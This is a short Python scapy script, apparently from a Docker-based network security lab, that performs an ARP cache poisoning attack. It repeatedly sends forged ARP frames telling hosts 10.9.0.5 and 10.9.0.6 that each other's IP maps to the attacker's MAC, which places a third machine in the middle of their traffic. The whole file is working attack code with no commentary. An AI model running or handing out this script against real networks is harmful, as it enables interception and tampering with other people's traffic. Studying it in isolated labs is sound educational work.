#!/usr/bin/python3
from scapy.all import *
from time import sleep
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

E = Ether(dst = MAC_A, src = MAC_M)  
A = ARP(hwsrc=MAC_M,psrc=IP_B,hwdst=MAC_A,pdst=IP_A,op=1) 
victim_A = E/A

E = Ether(dst = MAC_B, src = MAC_M)  
A = ARP(hwsrc=MAC_M,psrc=IP_A,hwdst=MAC_B,pdst=IP_B,op=1) 
victim_B = E/A

while True:
	sendp(victim_A)
	sendp(victim_B)
	sleep(5)
